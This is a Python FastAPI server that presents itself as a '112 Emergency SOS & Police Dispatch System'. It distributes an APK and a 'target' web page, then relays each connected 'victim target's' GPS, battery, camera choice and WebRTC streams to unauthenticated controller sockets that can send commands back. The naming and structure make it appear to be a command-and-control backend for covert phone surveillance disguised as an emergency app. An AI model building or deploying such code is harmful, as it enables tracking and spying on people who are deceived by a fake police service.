import os
import uuid
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
import uvicorn

app = FastAPI(title="112 Emergency SOS & Police Dispatch System")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Active targets: {target_id: {"ws": websocket, "meta": dict}}
active_targets: dict[str, dict] = {}
controller_sockets: set[WebSocket] = set()

# PWA Static Routes
@app.api_route("/manifest.json", methods=["GET", "HEAD"])
async def get_manifest():
    manifest_path = os.path.join(BASE_DIR, "manifest.json")
    if os.path.exists(manifest_path):
        return FileResponse(manifest_path, media_type="application/manifest+json")
    return JSONResponse(content={"error": "Manifest not found"}, status_code=404)

@app.api_route("/sw.js", methods=["GET", "HEAD"])
async def get_service_worker():
    sw_path = os.path.join(BASE_DIR, "sw.js")
    if os.path.exists(sw_path):
        return FileResponse(sw_path, media_type="application/javascript", headers={"Service-Worker-Allowed": "/"})
    return Response(content="// sw not found", media_type="application/javascript")

# Web Views
@app.api_route("/", methods=["GET", "HEAD"])
@app.api_route("/dashboard", methods=["GET", "HEAD"])
@app.api_route("/dashboard.html", methods=["GET", "HEAD"])
@app.api_route("/dispatch", methods=["GET", "HEAD"])
async def get_dashboard():
    return FileResponse(os.path.join(BASE_DIR, "dashboard.html"))

@app.api_route("/sos", methods=["GET", "HEAD"])
@app.api_route("/target", methods=["GET", "HEAD"])
@app.api_route("/target_web.html", methods=["GET", "HEAD"])
async def get_sos_app():
    return FileResponse(os.path.join(BASE_DIR, "target_web.html"))

@app.api_route("/download-apk", methods=["GET", "HEAD"])
@app.api_route("/112_SOS_System.apk", methods=["GET", "HEAD"])
@app.api_route("/app.apk", methods=["GET", "HEAD"])
async def download_apk():
    apk_path = os.path.join(BASE_DIR, "112_SOS_System.apk")
    if os.path.exists(apk_path):
        return FileResponse(
            apk_path,
            media_type="application/vnd.android.package-archive",
            filename="112_SOS_System.apk"
        )
    return JSONResponse(content={"error": "APK not found"}, status_code=404)

@app.get("/api/health")
async def health_check():
    return {
        "status": "healthy",
        "service": "112 Emergency Response System (ERSS)",
        "active_targets": len(active_targets),
        "active_controllers": len(controller_sockets)
    }

# WebSockets
@app.websocket("/ws/target")
@app.websocket("/ws/target/{explicit_target_id}")
async def target_endpoint(websocket: WebSocket, explicit_target_id: str = None):
    await websocket.accept()
    target_id = explicit_target_id if explicit_target_id else f"SOS-{uuid.uuid4().hex[:6].upper()}"
    active_targets[target_id] = {
        "ws": websocket,
        "meta": {
            "targetId": target_id,
            "sos_active": False,
            "gps": None,
            "battery": None,
            "camera": "user"
        }
    }
    print(f"[+] 112 Victim Target connected: {target_id}")

    # Send assigned target ID back to the target client
    await websocket.send_text(json.dumps({"type": "init", "targetId": target_id}))

    # Notify all active 112 dispatch controllers immediately
    join_notification = json.dumps({
        "type": "target_joined",
        "targetId": target_id,
        "meta": active_targets[target_id]["meta"]
    })
    for ctrl in list(controller_sockets):
        try:
            await ctrl.send_text(join_notification)
        except Exception:
            controller_sockets.discard(ctrl)

    try:
        while True:
            raw_data = await websocket.receive_text()
            try:
                msg = json.loads(raw_data)
            except Exception:
                continue

            # Heartbeat ping from target
            if msg.get("type") == "ping":
                try:
                    await websocket.send_text(json.dumps({"type": "pong"}))
                except Exception:
                    break
                continue

            # Update cached metadata if SOS, GPS, or battery info arrives
            msg_type = msg.get("type")
            if target_id in active_targets:
                if msg_type in ("sos_alert", "sos_activated"):
                    active_targets[target_id]["meta"]["sos_active"] = True
                    if "gps" in msg:
                        active_targets[target_id]["meta"]["gps"] = msg["gps"]
                elif msg_type == "sos_cancelled":
                    active_targets[target_id]["meta"]["sos_active"] = False
                elif msg_type == "gps_update":
                    if msg.get("is_sos"):
                        active_targets[target_id]["meta"]["sos_active"] = True
                    if "gps" in msg:
                        active_targets[target_id]["meta"]["gps"] = msg["gps"]
                elif msg_type == "battery_update" and "battery" in msg:
                    active_targets[target_id]["meta"]["battery"] = msg["battery"]
                elif msg_type == "camera_info" and "camera" in msg:
                    active_targets[target_id]["meta"]["camera"] = msg["camera"]

            msg["targetId"] = target_id
            payload = json.dumps(msg)

            # Relay all telemetry & WebRTC signaling to connected 112 dispatchers
            for ctrl in list(controller_sockets):
                try:
                    await ctrl.send_text(payload)
                except Exception:
                    controller_sockets.discard(ctrl)
    except WebSocketDisconnect:
        pass
    finally:
        active_targets.pop(target_id, None)
        print(f"[-] 112 Victim Target disconnected: {target_id}")
        leave_notification = json.dumps({"type": "target_left", "targetId": target_id})
        for ctrl in list(controller_sockets):
            try:
                await ctrl.send_text(leave_notification)
            except Exception:
                controller_sockets.discard(ctrl)

@app.websocket("/ws/controller")
async def controller_endpoint(websocket: WebSocket):
    await websocket.accept()
    controller_sockets.add(websocket)
    print("[*] 112 Dispatch Controller connected.")

    # Send current active target list and their state to new dispatcher
    targets_data = [
        target_info["meta"] for target_info in active_targets.values()
    ]
    initial_targets = json.dumps({
        "type": "active_targets",
        "targets": list(active_targets.keys()),
        "targets_data": targets_data
    })
    await websocket.send_text(initial_targets)

    try:
        while True:
            raw_data = await websocket.receive_text()
            try:
                msg = json.loads(raw_data)
            except Exception:
                continue

            if msg.get("type") == "ping":
                try:
                    await websocket.send_text(json.dumps({"type": "pong"}))
                except Exception:
                    break
                continue

            target_id = msg.get("targetId")
            # Forward signaling / dispatch commands to the specific target
            if target_id and target_id in active_targets:
                target_ws = active_targets[target_id]["ws"]
                try:
                    await target_ws.send_text(json.dumps(msg))
                except Exception:
                    active_targets.pop(target_id, None)
    except WebSocketDisconnect:
        pass
    finally:
        controller_sockets.discard(websocket)
        print("[-] 112 Dispatch Controller disconnected.")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run("server:app", host="0.0.0.0", port=port, reload=False)
